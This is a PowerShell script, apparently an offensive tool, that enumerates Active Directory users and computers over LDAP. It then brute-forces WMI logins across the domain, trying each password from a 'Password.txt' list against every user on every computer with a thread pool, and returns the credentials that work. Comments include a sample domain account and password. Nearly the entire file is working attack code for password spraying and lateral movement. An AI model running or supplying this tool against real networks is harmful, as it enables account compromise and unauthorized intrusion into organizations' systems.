function Get-DomainUser 
{

    Param(
        $Credential
    )

    Process
    {
        $UserSearcher = Get-DomainSearcher -Credential $Credential
        $UserComputer = Get-DomainSearcher -Credential $Credential
        $Filter = ''
        $CompAndUserTable = @{}
        if($UserSearcher)
        {
            $UserSearcher.filter = "(&(samAccountType=805306368)$Filter)"
            $UserComputer.filter = "(&(samAccountType=805306369)$Filter)"
            #$Results_Domain = $UserSearcher.FindAll()
            #$Results_Computer = $UserComputer.FindAll()
            $UserNameList = @()
            ForEach($_ in $UserSearcher.FindAll())
            {
                if($_.Properties.name)
                {
                    $UserNameList += [String[]]( $env:USERDNSDOMAIN + '\' + [String[]] $_.Properties.name)
                }
            }
            ForEach($_ in $UserComputer.FindAll())
            {
                if($_.Properties)
                {
                    if($_.Properties.dnshostname)
                    {    
                        [String]$BindServer = [String[]]$_.Properties.dnshostname
                        $CompAndUserTable[$BindServer] = $UserNameList
                    
                    }
                 }
             }
    
        }
        $CompAndUserTable
    }

}

function Get-DomainSearcher
{
    Param(
        $Credential
    )

    Process{
        # One Credential
        # Two $ENV:USERDNSDOMAIN
        # Three Current Domain
        if($Credential)
        {
            $DomainObject = Get-Domain -Credential $Credential
            if($DomainObject)
            {
                $TargetDomain = $DomainObject.Name
                $BindServer = ($DomainObject.PdcRoleOwner).Name
            }
            else
            {
                Write-Host "[!]$DomainObject is unValied"
            }

        }
        elseif($ENV:USERDNSDOMAIN -and ($ENV:USERDNSDOMAIN.Trim() -ne 0))
        {
            # CORP.HACKY.REN
            $TargetDomain = $ENV:USERDNSDOMAIN
            if($ENV:LOGONSERVER -and ($ENV:LOGONSERVER).Trim() -ne 0)
            {
                $BindServer = "$($ENV:LOGONSERVER -replace '\\','').$TargetDomain"
            }
            
        }

        if(($TargetDomain -eq $null) -or ($BindServer -eq $null))
        {
            $DomainObject = Get-Domain
            if($DomainObject)
            {
                $BindServer = ($DomainObject.PdcRoleOwner).Name
                $TargetDomain = $DomainObject.Name
            }
            else
            {
                Write-Host "[!]$DomainObject is unValied"
            }

        }

        $SearchString = 'LDAP://'
        if($BindServer -and $TargetDomain)
        {
            $SearchString += $BindServer + '/'
            $DN = "DC=$($TargetDomain.Replace('.', ',DC='))"
            $SearchString += $DN
        }

        if ($Credential -ne [Management.Automation.PSCredential]::Empty) {
            Write-Verbose "[Get-DomainSearcher] Using alternate credentials for LDAP connection"
            # bind to the inital search object using alternate credentials
            $DomainObject = New-Object DirectoryServices.DirectoryEntry($SearchString, $Credential.UserName, $Credential.GetNetworkCredential().Password)
            $Searcher = New-Object System.DirectoryServices.DirectorySearcher($DomainObject)
        }
        else {
            # bind to the inital object using the current credentials
            $Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
        }

        $Searcher.PageSize = 200
        $Searcher.SearchScope = 'Subtree'
        $Searcher.CacheResults = $False
        $Searcher.ReferralChasing = [System.DirectoryServices.ReferralChasingOption]::All

        $Searcher
    }
}

# Get Domain Object
function Get-Domain
{
    Param(
        $Credential
    )
    Process{
        if($PSBoundParameters['Credential'])
        {
            $TargetDomain = $Credential.GetNetworkCredential().Domain
            $DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain',$TargetDomain,$Credential.UserName, $Credential.GetNetworkCredential().Password)
            try
            {
                [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)
            }
            catch
            {
                Write-Host "[!]Error Get '$TargetDomain' Domain By Credential"
            }
        }
        else
        {
            try
            {
                [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
            }
            catch
            {
                Write-Host "[!]Error Get Current Domain"
            }
        }
    }
}


function Connect-WMI($ComputerName,$UserName,$Password)
{
    $ChangedPassword = ConvertTo-SecureString $Password -asplaintext -force 
    $Credential = New-Object -Typename System.Management.Automation.PSCredential -argumentlist $Username,$ChangedPassword
    $connect = Get-WmiObject Win32_OperatingSystem -ComputerName $ComputerName -Credential  $Credential
    if($connect)
    {
        return $ComputerName,$Credential
    }
    return $null,$null
}

function ConnectWMI-violence
{
    # $UserUsername = "corp\hacky"
    # $UserPassword = "wxy.12345"
    # $ChangedPassword = ConvertTo-SecureString $UserPassword -asplaintext -force 
    # $Credential = New-Object -Typename System.Management.Automation.PSCredential -argumentlist $UserUsername,$ChangedPassword
    Param($Credential)

    $CompAndUserTable = Get-DomainUser  -Credential $Credential
    
    $ThreadPool = [RunspaceFactory]::CreateRunspacePool(1, 20, $Host)
    $ThreadPool.Open()

    [Management.Automation.PowerShell[]]$Job = @()
    [Object[]]$Handle = @()
    [Int32]$temp = 0
    $ResList = @{}
    ForEach($Password in Get-Content "Password.txt")
    {
        ForEach($EachKey in $CompAndUserTable.Keys)
        {
            $ComputerName = $EachKey
            ForEach($UserName in $CompAndUserTable[$ComputerName])
            {
                $Job += [PowerShell]::Create().AddScript(${Function:Connect-WMI}).AddArgument($ComputerName).AddArgument($UserName).AddArgument($Password)
                $Job[$temp].RunspacePool = $ThreadPool
                $Handle += $Job[$temp].BeginInvoke()
                $temp++
            }
            
            [Boolean]$Complete = $false
            
            while (!$Complete) 
            {
                Start-Sleep -Milliseconds 20

                $Complete = $true

                for ($i = 0; $i -lt $temp; $i++) 
                {
                    if ($Handle[$i] -eq $null) { continue }
                    if ($Handle[$i].IsCompleted) 
                    {
                        $ResComputerName,$ResCredential = $Job[$i].EndInvoke($Handle[$i])
                        if(($ResComputerName -ne $null)-and ($ResCredential -ne $null))
                        {
                            $ResList[$ResComputerName] = $ResCredential
                        }
                        $Job[$i].Dispose()
                        $Handle[$i] = $null
                    } 
                    else 
                    {
                        $Complete = $false
                    }
                }
            }
        }
    }
    return $ResList
}


#ConnectWMI-violence